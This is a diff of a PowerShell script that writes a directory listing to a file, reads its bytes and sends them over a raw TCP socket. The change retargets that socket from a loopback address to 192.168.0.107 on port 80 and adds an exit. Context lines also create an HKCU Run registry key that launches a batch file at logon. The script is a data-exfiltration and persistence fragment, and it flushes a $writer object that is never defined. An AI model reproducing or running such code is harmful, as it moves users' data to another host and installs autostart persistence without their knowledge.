@@ -14,7 +14,7 @@ ls | Out-File -FilePath ./Process2.txt -Append
 #start http post 
 
 $test=[io.file]::ReadAllBytes("Process2.txt");
-$socket = New-Object net.sockets.tcpclient('127.0 0.1',65421);
+$socket = New-Object net.sockets.tcpclient('192.168.0.107',80);
 $stream = $socket.GetStream();
 $stream.write($test,0,$test.Length);
 $writer.flush();
@@ -29,3 +29,6 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
     -Value "C:\Documents\#simple download.bat"
 
 Start-Sleep -Seconds 1.5
+exit
+
+
